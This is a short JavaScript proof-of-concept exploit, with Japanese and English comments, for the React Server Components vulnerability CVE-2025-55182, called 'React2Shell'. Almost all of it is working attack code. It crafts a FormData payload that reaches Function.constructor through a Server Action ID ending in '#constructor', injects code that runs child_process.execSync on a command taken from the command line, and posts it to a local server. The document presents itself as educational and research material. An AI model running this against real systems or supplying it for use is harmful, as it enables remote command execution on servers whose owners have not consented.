// CVE-2025-55182 (React2Shell) Proof of Concept
// Based on: https://github.com/dwisiswant0/CVE-2025-55182
//
// ⚠️ 教育・研究目的のみ / For Educational and Research Purposes Only
//
// Exploit Essence (エクスプロイトの本質):
// 1. React Server Components (RSC) のデシリアライゼーション処理を悪用
// 2. FormDataペイロードで Server Action の `.constructor` プロパティにアクセス
// 3. Functionコンストラクタを利用して任意のJavaScriptコードを実行
// 4. child_processモジュールを使ってOSコマンドを実行
//
// Technical Details (技術的な詳細):
// - Server Action IDに `#constructor` を付加することで Function.constructor にアクセス
// - `bound` パラメータで実行するコードを注入
// - RSCのFlightプロトコルのパース処理中に eval 相当の処理が発生

async function pwn(cmd = 'id') {
  const formData = new FormData();
  
  // Step 1: Server Action参照を設定
  formData.append('0', '"$F1"');
  
  // Step 2: .constructor経由でFunction.constructorにアクセス
  // "user-profile-action" は任意のダミーID (実際のServer Action IDでなくても動作)
  formData.append('1', '{"id":"user-profile-action#constructor","bound":"$@2"}');
  
  // Step 3: 実行するJavaScriptコードを構築
  // import('child_process')でモジュールを動的ロード
  // execSync()でコマンドを実行し、結果を文字列として返す
  let susCode = `const cmd = ${JSON.stringify(cmd)};`
  susCode += `
  return import('child_process').then(cp => {
    const output = cp.execSync(cmd).toString();
    return output;
  }).catch(e => console.log('err:', e.message));`;
  
  // JSONエスケープしてペイロードに追加
  formData.append('2', `["${JSON.stringify(susCode).slice(1, -1)}"]`);

  try {
    const response = await fetch('http://localhost:3000', {
      method: 'POST',
      body: formData
    });

    const text = await response.text();
    console.log("Response:", text);
    process.exit(0);
  } catch (e) {
    console.error("Request failed:", e);
    process.exit(1);
  }
}

// コマンドライン引数からコマンドを取得 (デフォルト: 'id')
const args = process.argv.slice(2).join(' ');
pwn(args);